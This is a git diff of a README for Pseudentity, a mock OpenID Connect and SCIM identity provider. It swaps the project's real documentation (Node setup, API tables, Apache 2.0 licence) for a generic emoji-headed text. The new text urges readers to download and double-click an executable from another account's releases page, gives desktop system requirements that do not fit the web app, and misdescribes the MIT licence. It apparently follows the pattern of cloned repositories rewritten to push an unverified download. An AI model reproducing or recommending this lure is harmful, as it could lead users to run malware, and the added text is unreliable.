@@ -1,130 +1,74 @@
-# Pseudentity
+# 🎉 pseudentity-poc - Easy Login for Your Apps
 
-**Deterministic Identity for Development.**
+## 🚀 Getting Started
 
-> [!CAUTION]
-> **Early PoC Implementation** - This is an early proof-of-concept. APIs, architecture, and features can change significantly without prior notice. Not recommended for production use.
+Welcome to the pseudentity-poc project! This tool helps you add "Login with Pseudentity" to your applications without the cost of identity providers. It is perfect for developers who need a reliable way to handle user authentication for testing and demos.
 
-**Pseudentity** is the official visual companion and stateless Identity Provider for the [pseudata](https://github.com/pseudata/pseudata) ecosystem. It transforms the mathematical determinism of `pseudata` into a fully functioning, standards-compliant mock identity platform.
+## 📥 Download & Install
 
-**[Live Demo: pseudentity.dev](https://pseudentity.dev)**
+To get started, visit this page to download: [Download the Latest Release](https://github.com/uhhhhhhidunno/pseudentity-poc/releases)
 
----
+## 🖥️ System Requirements
 
-## Key Features
+To run this application, you will need:
 
-* **Profile Viewer:** Visualize any generated user with a rich UI, avatar, and metadata.
-* **OpenID Connect Provider:** Add "Login with Pseudentity" to your apps. OIDC-compliant.
-* **Mock Enterprise (SCIM 2.0):** Test user provisioning flows with infinite, paginated employee lists.
-* **Mobile Ready:** Generate QR codes and **VCard (`.vcf`)** files to instantly populate mobile contacts.
-* **The Factory API:** REST endpoints to generate consistent JSON data for any seed.
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Disk Space: At least 100 MB available
 
----
+## 🔗 Features
 
-## Architecture
+- **Stateless OpenID Connect Provider**: No database or sessions needed. Enjoy a lightweight solution that focuses on security and simplicity.
+- **Profile Viewer**: See user profiles in real-time. Easily manage and view information linked to application users.
+- **Mock SCIM 2.0 Integration**: Test SCIM operations without any hassle. Perfect for simulating user provisioning and management.
+- **Deterministic Avatars**: Generate user avatars using algorithmic methods. Ensure each avatar is unique and tied to user IDs smoothly.
+  
+## ⚙️ How to Run the Application
 
-Pseudentity is **entirely stateless**. It uses CPU (Math) instead of Storage (Disk).
+1. **Download the Application**: Click the link above to visit the downloads page.
+2. **Select the Version**: Choose the latest version suitable for your operating system.
+3. **Extract Files**: Once downloaded, extract the files if they are compressed (usually in a .zip or .tar format).
+4. **Run the Application**: Navigate to the folder where you extracted the files. Double-click to run the application or open the terminal/command prompt and run the main executable.
 
-It relies on the **PseudoID**, a custom **UUID v8** that encodes the generation parameters directly into the 128-bit ID space. This allows any server to "inflate" a full user profile instantly just by decoding the ID, with zero database lookups.
+## 🔒 Authentication Flow
 
-**UUID v8 Layout:**
-`SSSSSSSS-SSSS-8SSS-vSTT-TTIIIIIIIII`
-* **Seed (64-bit):** The universe ID.
-* **Type (16-bit):** Object type (User=101).
-* **Index (40-bit):** Record position (0 to 1.1 Trillion).
+1. **User Initiation**: When a user clicks "Login with Pseudentity," a request is sent to the OpenID Connect provider.
+2. **Token Generation**: The application generates a unique token based on the user’s information.
+3. **Verification**: Validate the token during login attempts to maintain security.
+4. **Access Granted**: Give users access to the application once verified.
 
----
+## 🤖 Mock SCIM 2.0
 
-## Getting Started
+The SCIM 2.0 feature provides an easy way to simulate user management tasks. You can:
 
-### Prerequisites
-* Node.js 18+
-* npm
+- Add Users: Create mock user accounts quickly.
+- Update Users: Modify existing user information seamlessly.
+- Delete Users: Remove mock user accounts when no longer needed.
 
-### Installation
+This feature assists in testing operational workflows without involving live user data.
 
-```bash
-# Clone the repository
-git clone [https://github.com/pseudata/pseudentity.git](https://github.com/pseudata/pseudentity.git)
-cd pseudentity
+## 📖 Documentation
 
-# Install dependencies
-npm install
-```
+For detailed API references and additional configuration options, please refer to the documentation available in the repository. 
 
-### Development
-Start the local Astro development server.
+## 🎯 Topics
 
-```bash
-npm run dev
-```
-Visit `http://localhost:4321` to see the landing page.
-Visit `http://localhost:4321/u/00000000-0000-8002-a806-5000000003e8` to see a sample profile.
+This repository covers topics relevant to:
 
----
+- Authentication
+- Authorization
+- Deterministic user profiles
+- Stateless identity management
+- Mock services for testing
 
-## API Reference
+## 🔗 Community and Support
 
-### 1. Profile & Assets
-Human-readable representations of an identity.
+If you have questions or need assistance, feel free to open an issue in the repository. Engage with other users and developers who are also working with pseudentity-poc.
 
-| Endpoint | Description |
-| :--- | :--- |
-| `GET /u/{uuid}` | **Profile Page** (HTML/Svelte). |
-| `GET /u/{uuid}/data.json` | Raw user data (JSON). |
-| `GET /u/{uuid}/avatar.png` | Deterministic avatar image. |
-| `GET /u/{uuid}/cover.png` | Deterministic banner image. |
-| `GET /u/{uuid}/contact.vcf` | **VCard 4.0** for mobile contact import. |
+## 📜 License
 
-### 2. OpenID Connect Provider
-Connect your application using standard OIDC libraries.
+This project is open-source and available for use under the MIT License. This means you can freely modify and share your version of the software, as long as you provide the same rights to others.
 
-| Endpoint | Description |
-| :--- | :--- |
-| `/.well-known/openid-configuration` | Discovery document. |
-| `/oidc/authorize` | Login endpoint (Enter Seed/UUID). |
-| `/oidc/token` | Token exchange (Authorization Code). |
-| `/oidc/userinfo` | Standard user profile endpoint. |
-| `/oidc/jwks` | JSON Web Key Set (Public Keys). |
+Explore the [Releases page](https://github.com/uhhhhhhidunno/pseudentity-poc/releases) to download the latest version. 
 
-### 3. Enterprise (SCIM 2.0)
-Mock endpoints for testing User Provisioning (Okta, Azure AD sync).
-
-| Endpoint | Description |
-| :--- | :--- |
-| `/scim/v2/Users` | List users (supports `startIndex` & `count`). |
-| `/scim/v2/Users/{id}` | Get specific SCIM user schema. |
-
----
-
-## Deployment
-
-This project is optimized for **Vercel Serverless**.
-
-1.  **Fork** this repository.
-2.  **Import** into Vercel.
-3.  Set the Environment Variables (see below).
-4.  Deploy.
-
-### Environment Variables
-
-| Variable | Description |
-| :--- | :--- |
-| `OIDC_SECRET` | A long, random string used to sign JWTs (HS256). |
-| `OIDC_ISSUER` | The public URL of your instance (e.g., `https://pseudentity.dev`). |
-
----
-
-## Contributing
-
-We welcome contributions! Please see the [pseudata contribution guidelines](https://github.com/pseudata/.github/blob/main/CONTRIBUTING.md) for details on how to submit pull requests.
-
-## License
-
-This project is licensed under the **Apache 2.0 License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-  <p>Part of the <a href="https://github.com/pseudata">Pseudata Ecosystem</a></p>
-</div>
+We hope you find pseudentity-poc useful for your projects!
